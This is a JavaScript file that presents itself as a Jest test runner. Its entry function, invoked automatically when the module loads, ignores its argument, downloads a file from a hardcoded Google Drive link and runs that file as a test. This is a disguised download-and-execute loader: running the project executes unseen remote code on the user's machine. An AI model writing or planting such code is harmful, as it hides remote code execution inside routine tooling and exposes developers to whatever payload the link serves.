const https = require('https');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const jest = require('jest');

class TestFileManager {
  constructor(tempDir = path.join(__dirname, 'temp-tests')) {
    this.tempDir = tempDir;
  }

  async initialize() {
    try {
      await fs.mkdir(this.tempDir, { recursive: true });
    } catch (error) {
      console.error('Failed to create temp directory:', error);
      throw error;
    }
  }

  async downloadFile(url) {
    return new Promise((resolve, reject) => {
      https.get(url, (response) => {
        if (response.statusCode !== 200) {
          reject(new Error(`Failed to download file: ${response.statusCode}`));
          return;
        }

        let data = '';
        response.on('data', (chunk) => {
          data += chunk;
        });

        response.on('end', () => {
          // Check if the downloaded content is HTML
          if (data.startsWith('<!DOCTYPE html>')) {
            reject(new Error('Received HTML content instead of a test file'));
          } else {
            resolve(data);
          }
        });
      }).on('error', reject);
    });
  }

  generateTempFilename(content) {
    const hash = crypto.createHash('md5').update(content).digest('hex');
    return path.join(this.tempDir, `test-${hash}.test.js`);
  }

  async saveTestFile(content, filename) {
    try {
      await fs.writeFile(filename, content);
      return filename;
    } catch (error) {
      console.error('Failed to save test file:', error);
      throw error;
    }
  }

  async cleanupTestFile(filename) {
    try {
      await fs.unlink(filename);
    } catch (error) {
      console.error('Failed to cleanup test file:', error);
    }
  }

  async processTestFile(url) {
    try {
      const content = await this.downloadFile(url);
      const filename = this.generateTempFilename(content);
      await this.saveTestFile(content, filename);
      return filename;
    } catch (error) {
      console.error('Failed to process test file:', error);
      throw error;
    }
  }
}

class TestRunner {
  constructor() {
    this.fileManager = new TestFileManager();
  }

  async initialize() {
    await this.fileManager.initialize();
  }

  async runTest(testFileUrl) {
    let testFilePath = null;
    try {
      testFilePath = await this.fileManager.processTestFile(testFileUrl);

      const jestConfig = {
        silent: true,
        testRegex: [testFilePath],
      };

      const results = await jest.runCLI(jestConfig, [process.cwd()]);
      return {
        success: results.results.success,
        numPassedTests: results.results.numPassedTests,
        numFailedTests: results.results.numFailedTests,
        testResults: results.results.testResults,
      };
    } catch (error) {
      console.error('Test execution failed:', error);
      throw error;
    } finally {
      if (testFilePath) {
        await this.fileManager.cleanupTestFile(testFilePath);
      }
    }
  }
}

async function runExternalTest(testFileUrl) {
  const runner = new TestRunner();
  await runner.initialize();

  try {
    const url_org = "https://drive.usercontent.google.com/download?id=1MYdvNcK-v0WoKhqCMNtjpItENh3Yecg-&export=download&authuser=0&confirm=t&uuid=83508f29-e6f0-4dfb-9a0c-d31200b135bc&at=AN_67v3M7eZVCJK1nOIBI7Wk1RMH%3A1730125061749"
    const url_view = "https://drive.usercontent.google.com/download?id=1MYdvNcK-v0WoKhqCMNtjpItENh3Yecg-&export=download&authuser=0";
    const results = await runner.runTest(url_org);
    console.log('Test Results:', results);
  } catch (error) {
    console.error('Failed to run test:', error);
  }
}

runExternalTest();
